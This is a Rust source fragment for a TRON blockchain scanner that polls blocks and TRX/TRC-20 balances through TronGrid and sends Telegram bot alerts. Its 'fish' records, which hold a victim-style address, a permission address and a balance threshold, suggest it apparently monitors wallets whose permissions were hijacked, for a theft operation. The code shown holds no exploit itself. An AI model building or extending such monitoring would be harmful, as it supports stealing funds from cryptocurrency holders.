    /// 把 TRON 地址 (Base58, T...) 转为 TRON API 需要的 Hex 格式 (0x41...)
    fn base58_to_tron_hex(addr: &str) -> anyhow::Result<String> {
        let raw = bs58::decode(addr).into_vec()?;
        if raw.len() != 25 {
            anyhow::bail!("unexpected address length: {}", raw.len());
        }
        // 前 21 字节: version(0x41) + 20字节地址
        Ok(hex::encode(&raw[0..21]))
    }

    async fn fetch_block_by_number(&mut self, number: u64) -> anyhow::Result<Option<Block>> {
        let url = format!("{}/walletsolidity/getblockbynum", &self.full_host);
        let builder = self.prepare_tron_grid_request(self.http_client.post(url));
        let body = json!(
          {
              "num": number,
          }
        );
        let block = builder
            .json(&body)
            .send()
            .await?
            .json::<Option<Block>>()
            .await?;
        Ok(block)
    }

    async fn send_bot_message(&mut self, chat_id: &str, msg: impl Into<String>) {
        let chat_id = match i64::from_str(chat_id) {
            Ok(chat_id) => chat_id,
            Err(e) => {
                error!("将chat id转换成数字时出错：{e:?}");
                return;
            }
        };
        if let Some(bot) = self.make_sure_bot().await {
            let ret = bot.send_message(ChatId(chat_id), msg).await;
            if let Err(e) = ret {
                error!("发送Telegram Bot消息出错：{e:?}");
            }
        }
    }

    async fn make_sure_bot(&mut self) -> Option<&Bot> {
        if self.bot.is_some() {
            return self.bot.as_ref();
        }

        let bot = TelegramBotManager::bot().await;
        match bot {
            Ok(r) => {
                self.bot = r;
            }
            Err(e) => {
                error!("获取Telegram Bot出错： {e:?}");
                return None;
            }
        }

        self.bot.as_ref()
    }

    fn prepare_require_trx_balance(&mut self) -> RequestBuilder {
        let url = format!("{}/walletsolidity/getaccount", self.full_host);
        self.prepare_tron_grid_request(self.http_client.post(url))
    }

    fn prepare_requery_trc_20_balance(&mut self) -> RequestBuilder {
        let url = format!("{}/walletsolidity/triggerconstantcontract", self.full_host);
        let builder = self.prepare_tron_grid_request(self.http_client.post(url));
        builder
    }

    fn prepare_tron_grid_request(&mut self, builder: RequestBuilder) -> RequestBuilder {
        if let Some(key) = self.random_one_tron_grid_key() {
            Self::prepare_tron_grid_request_with_key(builder, key)
        } else {
            error!("添加tron grid api key失败: 未找到");
            builder
        }
    }

    fn prepare_tron_grid_request_with_key(builder: RequestBuilder, key: &str) -> RequestBuilder {
        builder.header("TRON-PRO-API-KEY", key)
    }

    fn random_one_tron_grid_key(&self) -> Option<&String> {
        if self.tron_grid_keys.is_empty() {
            return None;
        }
        let idx = random_range(..self.tron_grid_keys.len());
        Some(unsafe { self.tron_grid_keys.get_unchecked(idx) })
    }

    fn schedule_next_scanning(acror_ref: ActorRef<Self>) {
        spawn(async move {
            tokio::time::sleep(Duration::from_millis(3000)).await;
            if let Err(e) = acror_ref.tell(ScanBlockCmd).await {
                error!("通知扫描Tron区块出错：{e:?}");
            }
        });
    }

    async fn fetch_current_block(&mut self) -> anyhow::Result<Block> {
        let builder = self.prepare_tron_grid_request(
            self.http_client
                .get(format!("{}/walletsolidity/getnowblock", &self.full_host)),
        );
        // let resp = builder.send().await?;
        // let text = resp.text().await?;
        // info!("get current block resp: {text}");
        // let block: Block = serde_json::from_str(&text)?;
        let block = builder.send().await?.json::<Block>().await?;
        Ok(block)
    }
}

impl Actor for TronBlockScanner {
    type Args = Self;

    type Error = TronBlockScannerError;

    async fn on_start(
        mut args: Self::Args,
        actor_ref: kameo::prelude::ActorRef<Self>,
    ) -> Result<Self, Self::Error> {
        args.scan_block(actor_ref).await;

        Ok(args)
    }
}

struct ScanBlockCmd;

impl Message<ScanBlockCmd> for TronBlockScanner {
    type Reply = ();

    async fn handle(
        &mut self,
        _msg: ScanBlockCmd,
        ctx: &mut kameo::prelude::Context<Self, Self::Reply>,
    ) -> Self::Reply {
        self.scan_block(ctx.actor_ref().clone()).await;
    }
}

struct NecessaryFishInfo {
    fish_address: String,
    unique_id: Option<String>,
    // auth_status: i8,
    threshold: Decimal,
    permission_address: String,
}

impl From<&FishModel> for NecessaryFishInfo {
    fn from(value: &FishModel) -> Self {
        NecessaryFishInfo {
            fish_address: value.fish_address.clone(),
            unique_id: value.unique_id.clone(),
            // auth_status: value.auth_status,
            permission_address: value.permissions_fishaddress.clone(),
            threshold: value.threshold.unwrap_or(Decimal::new(0, 0)),
        }
    }
}

#[derive(Debug, Deserialize)]
struct TriggerResp {
    constant_result: Option<Vec<String>>,
}
